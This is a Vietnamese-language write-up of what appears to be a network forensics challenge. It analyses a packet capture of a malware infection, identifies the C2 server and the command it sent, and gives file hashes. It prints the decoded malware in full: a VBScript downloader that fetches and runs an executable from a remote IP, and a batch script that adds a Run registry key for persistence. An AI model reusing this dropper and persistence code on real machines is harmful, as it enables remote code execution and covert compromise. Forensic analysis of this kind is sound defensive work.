### 1. Mã hash của tệp mã độc (không phải tệp nén)?

Đầu tiên, ta mở file pcapng bằng phần mềm [wireshark](https://www.wireshark.org/)
Để tìm được file độc hại đó thì ta phải xác định luồng nào là đang thực hiện tải xuống, việc tải xuống từ các trang web thì hay dùng giao thức HTTP, ta lọc theo giao thức này 

![File zip](/Media/pcap1.png "pcapng")

Ngay đầu gói tin thứ 73 đầu tiên, ta thấy được giao thức này đang thực hiện lệnh GET để tải file manual.zip. Ta sẽ tải file này về bằng cách chọn **File** > **Export Object** > **HTTP**

Hộp thoại bật lên, ta có thể thấy có nhiều gói tin lớn nhỏ khác nhau, tập chung vào file zip và chọn **Save**. Từ đây ta có thể dùng các công cụ online để unzip và băm MD5, tôi đã sử dụng một số lệnh trên kali:

![File](/Media/md5_manual_file.png "chm")


    860f86601bc18dd205a5edc0d57a658d

### 2. Địa chỉ của C2 Server được sử dụng để nhận thông tin (IP:PORT)?

Quay lại gói tin wireshark, thường để máy chủ C&C có thể giao tiếp với nạn nhân thì sẽ phải có 1 máy chủ với IP thật. Như vậy, hacker mới có thể giao tiếp cũng như ra lệnh cho các con bot. Để ý gói tin thứ 1125 cho thấy, có command và lệnh POST *(Hacker chọn lệnh POST vì có thể không muốn bị các phần mềm an ninh ghi lại log, đảm bảo quá trình diễn ra bí mật )*.

Ngay kế tiếp dưới nó có một lệnh POST khác upload cái gì đó lên. Như vậy, chúng ta có thể bước đầu xác định đây là cuộc tấn công **Trojan horse** vì có thể con malware trước đã mở backdoor cho một cuộc tấn công khác! 

Thực hiện **Follor HTTP Stream** ta thấy. Máy chủ C&C đã gửi một lệnh **dir**, lệnh này dùng để liệt kê các thư mục trong windows. Ngay ở phần HOST, đó chính là IP và POST của C&C server

![File](/Media/command_execute.png "chm")

    43.201.253.28:5000

### 3. Hãy gửi đường dẫn của tệp chương trình mà kẻ tấn công sử dụng làm backdoor duy trì sự hiện diện?

Để tìm được đường dẫn mà kẻ tấn công duy trì, trước hết cần xem qua file manual.chm  *(Bản chất file này cũng là 1 file nén dặc biệt của windows nên ta cũng có thẻ hoàn toàn unzip nó ra được)*. Thực hiện dùng 7zip để giải nén file đấy ra ta thu được 1 loạt các file:



![File](/Media/inside_malware_file.png "chm")

Ta để ý và lượt qua một số file thường thấy, tại đây ta thử kiểm tra file HTMl. Sau khi xem qua mã nguồn của file, thì ngay ở cuối cùng thấy xuát hiện 2 chuỗi kỳ lạ, có thể nó đã được mã hóa rồi, dùng các công cụ nhận diện mã hóa, ở đây tôi sử dụng cyberchef 

![File](/Media/html_content.png "html")

```
Option Explicit

Dim strURL, strTempPath, strSaveTo
Dim objXML, objStream, objShell
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")

Dim tempFolderPath
tempFolderPath = WshShell.ExpandEnvironmentStrings("%TEMP%")

Dim batFilePath
batFilePath = tempFolderPath & "\manual.bat"

WshShell.Run """" & batFilePath & """", 0, True

Set WshShell = Nothing

strURL = "http://43.203.173.81:8080"

Set objShell = CreateObject("WScript.Shell")
strTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")

strSaveTo = strTempPath & "\menual.exe"

Set objXML = CreateObject("MSXML2.ServerXMLHTTP")

Set objStream = CreateObject("ADODB.Stream")
objStream.Open

objXML.Open "GET", strURL, False
objXML.Send

If objXML.Status = 200 Then
    objStream.Type = 1 ' 
    objStream.Write objXML.ResponseBody
    objStream.Position = 0 

    objStream.SaveToFile strSaveTo, 1
    objStream.Close

    objShell.Run strSaveTo, 1, False

End If

Set objStream = Nothing
Set objXML = Nothing
Set objShell = Nothing
```
```
@echo off
setlocal

set "tempPath=%TEMP%"

set "programPath=%tempPath%\guide.vbs"

set "regKeyName=Manual"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%regKeyName%" /d "\"%programPath%\"" /f

endlocal
```

Trên đây là 2 đoạn đã giải mã từ đoạn mã hóa được xác định bằng giải mã base64, mã lệnh được viết bằng **VBScript**. Đoạn mã đầu tiên được thiết lập trỏ tới 1 file batch, sau đó gửi 1 yêu cầu GET lên máy chủ C&C, tải xuống 1 file menual.exe về.  Như vậy chính nó đã làm backdoor để tải file .exe về. 

Đoạn mã thứ 2 được viết vào file .bat, Tạo ra biến cục bộ tránh ảnh hưởng tới các biến khác, biến này trỏ đến thư mục TEMP và một biến khác trỏ tới file trong mã trên. Thực hiện thay đổi registry key để tự động kích hoạt mỗi khi người dùng đăng nhập vào windows. 

    C:\Users\user\AppData\Local\Temp\menual.exe


### 4. Mã độc đã nhận được lệnh gì từ C2 Server?

Theo lời dẫn giải tìm được trong câu 2, ta có thể kết luận 

    dir

### 5. Sau khi được thực thi, mã độc đã tải về một tệp mã độc khác, hãy trả lời url được sử dụng để tải về.?

Theo câu 3 vừa tìm được, ta thấy, file .exe được tải về được xác định sẵn tên

     menual.exe

### 6. Mã hash của độc menual?

Đầu tiên ta cần tìm ra được file menual.exe đấy, vì là tải về từ server nên các công cụ giám sát có thể đã ghi lại quá trình đó. Ta quay trở lại phân tích gói pcapng, xem quá trình sau khi file backdoor được tải về.

![menual](/Media/menual_execute_file.png "exe")

Như trong câu 3, trong biến STRurl có chứa 1 địa chỉ để tải xuống 1 file .exe thật trùng khớp với địa chỉ hiện trong Hostname, thực hiện tải về. Và check loại file

![2%f](/Media/file_check.png "/")

Vậy đây chính là file menual.exe mà mình cần, thực hiện hash nó, ta có câu trả lời

    0de9be1aba2e6dc3ce016fb24bfaad9e